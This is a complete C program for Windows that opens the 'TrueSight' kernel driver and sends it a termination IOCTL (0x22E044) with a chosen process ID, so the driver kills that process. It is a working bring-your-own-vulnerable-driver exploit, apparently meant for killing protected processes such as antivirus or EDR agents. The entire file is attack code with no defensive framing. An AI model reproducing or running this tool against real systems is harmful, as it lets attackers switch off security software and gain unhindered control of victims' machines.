#include <stdio.h>
#include <Windows.h>

#define DRIVER_SYMLINK L"\\\\.\\TrueSight"
#define TERMINATE_IOCTL 0x22E044

typedef struct _killerBuff {
	int PID;
} killerBuff, * pKillerBuff;

int main(int argc, char* argv[]) {
	unsigned int PID; // 30896;
	if (argc < 2) {
		printf("Provide a PID\n%s <PID>", argv[0]);
		PID = 21816;
	}
	else {
		PID = atoi(argv[1]);
		printf("PID to be targetted: %d\n", PID);
	}

	killerBuff buff = { PID };

	HANDLE hDriver = CreateFile(DRIVER_SYMLINK, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hDriver) {
		printf("Could not open handle to the Driver\n");
	}

	DWORD bytesReturned = 0;
	BYTE outBuffer[256];

	BOOL ioctl_result = DeviceIoControl(hDriver, TERMINATE_IOCTL, &PID, sizeof(PID),&outBuffer,256,&bytesReturned, NULL);
	if (ioctl_result) {
		printf("Must've Died\n");
	}
	else {
		printf("Something botched up\n");
	}

	return 0;
}